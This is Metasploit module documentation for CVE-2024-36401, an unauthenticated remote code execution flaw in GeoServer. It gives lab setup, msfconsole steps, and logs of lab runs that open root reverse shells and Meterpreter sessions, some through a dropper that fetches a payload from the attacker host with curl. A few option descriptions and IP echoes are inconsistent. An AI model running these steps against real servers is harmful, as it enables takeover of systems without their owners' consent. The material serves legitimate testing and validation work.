## Vulnerable Application

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and sharegeospatial data.
It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as
Geographic Information System (GIS) databases, web-based data, and personal datasets.

In the GeoServer versions prior to `2.23.6`, between version `2.24.0` and `2.24.3` and in version `2.25.0`, `2.25.1`,
multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input
against a default GeoServer installation due to unsafely evaluating property names as `XPath` expressions.
An attacker can abuse this by sending a POST request with a malicious xpath expression to execute arbitrary commands as root on the system.

The following GeoServer releases are tested:

**Osgeo.org Docker releases with Tomcat**
* docker.osgeo.org/geoserver 2.25.0
* docker.osgeo.org/geoserver 2.24.2
* docker.osgeo.org/geoserver 2.23.2
* docker.osgeo.org/geoserver 2.23.0
* docker.osgeo.org/geoserver 2.21.1

**Vulhub Docker releases with Jetty**
* vulhub/geoserver 2.23.2
* vulhub/geoserver 2.22.1

**Linux binary installs with Jetty**
* geoserver 2.23.5 on x64 Ubuntu 22.04
* geoserver 2.23.5 on Raspberry PI-4 ARM64 Kali Linux 2024.4

**Windows 10 installer installs with Jetty**
* geoserver 2.25.0 on x64 Windows 10 (10.0 Build 19045)

## Installation steps to install the GeoServer web application
* [Installation steps](https://docs.geoserver.org/latest/en/user/installation/win_installer.html) for Windows installer.
* [Installation steps](https://docs.geoserver.org/latest/en/user/installation/linux.html) for platform-independent Linux binary.
* [Installation steps](https://docs.geoserver.org/latest/en/user/installation/docker.html) for osgeo.org/geoserver docker images.
* Use the docker-compose.yaml config file below to pull the vulhub geoserver docker images.
```yaml
version: '3'
services:
 web:
   image: vulhub/geoserver:2.23.2
   ports:
    - "8080:8080"
    - "5005:5005"
```
*  Pull and install the docker image with `docker compose up -d`
* You should now be able to access the GeoServer web application via `http://your_ip:8080/geoserver`.

You are ready to test the module.

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ]  `set lhost <attacker-ip>`
- [ ] `set target <0=Unix Command, 1=Linux Dropper>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options
No specific options.

## Scenarios
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > info

       Name: Geoserver unauthenticated Remote Code Execution
     Module: exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
   Platform: Unix, Linux
       Arch: cmd, x86, x64, aarch64, armle
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-07-01

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Steve Ikeoka

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix Command
      1   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                        cs/using-metasploit.html
  RPORT      8080             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The URI path of the OpenMediaVault web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the
                                       local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  GeoServer is an open-source software server written in Java that provides
  the ability to view, edit, and share geospatial data.
  It is designed to be a flexible, efficient solution for distributing geospatial data
  from a variety of sources such as Geographic Information System (GIS) databases,
  web-based data, and personal datasets.
  In the GeoServer versions < 2.23.6, >= 2.24.0, < 2.24.4 and >= 2.25.0, < 2.25.1,
  multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users
  through specially crafted input against a default GeoServer installation due to unsafely
  evaluating property names as XPath expressions.
  An attacker can abuse this by sending a POST request with a malicious xpath expression
  to execute arbitrary commands as root on the system.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2024-36401
  https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
  https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401
  https://attackerkb.com/topics/W6IDY2mmp9/cve-2024-36401


View the full module info with the info -d command.
```
###  GeoServer 2.23.5 on x64 Ubuntu 22.04 - cmd/unix/reverse_bash
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401)  > set rhosts 192.168.201.86
rhosts => 192.168.201.86
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401)  > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.23.5
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Command shell session 7 opened (192.168.201.8:4444 -> 192.168.201.86:54072) at 2024-07-11 16:09:30 +0000

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux cuckoo 5.15.0-102-generic #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
pwd
/usr/share/geoserver
exit
```
###  GeoServer 2.23.5 on ARM64 Raspberry PI-4 Kali Linux 2024.4 - cmd/unix/reverse_bash
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 0
target => 0
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set rhosts 192.168.201.10
rhosts => 192.168.201.10
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.23.5
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Command shell session 8 opened (192.168.201.8:4444 -> 192.168.201.10:50292) at 2024-07-11 16:15:31 +0000

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux cerberus 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-11) aarch64 GNU/Linux
pwd
/usr/share/geoserver
exit
```
###  GeoServer 2.23.2 on vulhub docker image - cmd/unix/reverse_bash
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 0
target => 0
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set rhosts 192.168.201.42
rhosts => 192.168.201.10
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.23.2
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Command shell session 9 opened (192.168.201.8:4444 -> 192.168.201.42:60290) at 2024-07-11 18:42:08 +0000

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux e3f986905bde 6.6.32-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Jun 13 14:14:43 UTC 2024 x86_64 GNU/Linux
pwd
/mnt/geoserver
```
###  GeoServer 2.23.2 on vulhub docker image - linux/x64/meterpreter_reverse_tcp
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 1
target => 1
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set srvport 1981
srvport => 1981
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.23.2
[*] Executing Linux Dropper for linux/x64/meterpreter_reverse_tcp
[*] Using URL: http://192.168.201.8:1981/FEflDEJ
[*] Client 192.168.201.42 (curl/7.74.0) requested /FEflDEJ
[*] Sending payload to 192.168.201.42 (curl/7.74.0)
[*] Command Stager progress - 100.00% done (113/113 bytes)
[*] Meterpreter session 10 opened (192.168.201.8:4444 -> 192.168.201.42:60353) at 2024-07-11 18:48:02 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 172.21.0.2
OS           : Debian 11.3 (Linux 6.6.32-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/mnt/geoserver
meterpreter >
```
###  GeoServer 2.25.0 on osgeo.org/geoserver docker image - linux/x64/meterpreter_reverse_tcp
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 1
target => 1
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.25.0
[*] Executing Linux Dropper for linux/x64/meterpreter_reverse_tcp
[*] Using URL: http://192.168.201.8:1981/CEkJIBo
[*] Client 192.168.201.42 (curl/7.81.0) requested /CEkJIBo
[*] Sending payload to 192.168.201.42 (curl/7.81.0)
[*] Command Stager progress - 100.00% done (113/113 bytes)
[*] Meterpreter session 11 opened (192.168.201.8:4444 -> 192.168.201.42:61350) at 2024-07-11 20:46:14 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 22.04 (Linux 6.6.32-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/opt
meterpreter >
```
###  GeoServer 2.23.5 on ARM64 Raspberry PI-4 Kali Linux 2024.4 - linux/aarch64/meterpreter_reverse_tcp
```msf
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 1
target => 1
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set payload linux/aarch64/meterpreter_reverse_tcp
payload => linux/aarch64/meterpreter_reverse_tcp
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set rhosts 192.168.201.10
rhosts => 192.168.201.10
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.23.5
[*] Executing Linux Dropper for linux/aarch64/meterpreter_reverse_tcp
[*] Using URL: http://192.168.201.8:1981/680jWmUv1qm
[*] Client 192.168.201.10 (curl/8.5.0) requested /680jWmUv1qm
[*] Sending payload to 192.168.201.10 (curl/8.5.0)
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Meterpreter session 12 opened (192.168.201.8:4444 -> 192.168.201.10:60692) at 2024-07-11 21:04:34 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.201.10
OS           : Debian  (Linux 5.15.44-Re4son-v8l+)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > getuid
Server username: root
meterpreter > pwd
/usr/share/geoserver
meterpreter >
```
### GeoServer 2.25.0 on x64 Windows 10 (10.0 Build 19045)
```
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set rhosts 172.16.199.131
rhosts => 172.16.199.131
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set target 2
target => 2
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/geoserver_unauth_rce_cve_2024_36401) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Trying to detect if target is running a vulnerable version of GeoServer.
[+] The target appears to be vulnerable. Version 2.25.0
[*] Executing Windows Command for cmd/windows/http/x64/meterpreter/reverse_tcp
[*] Sending stage (201798 bytes) to 172.16.199.131
[*] Meterpreter session 2 opened (172.16.199.1:4444 -> 172.16.199.131:51235) at 2024-07-11 16:14:11 -0700

meterpreter > getuid
Server username: DESKTOP-N3ORU31\msfuser
meterpreter > sysinfo
Computer        : DESKTOP-N3ORU31
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```
## Limitations
No limitations.
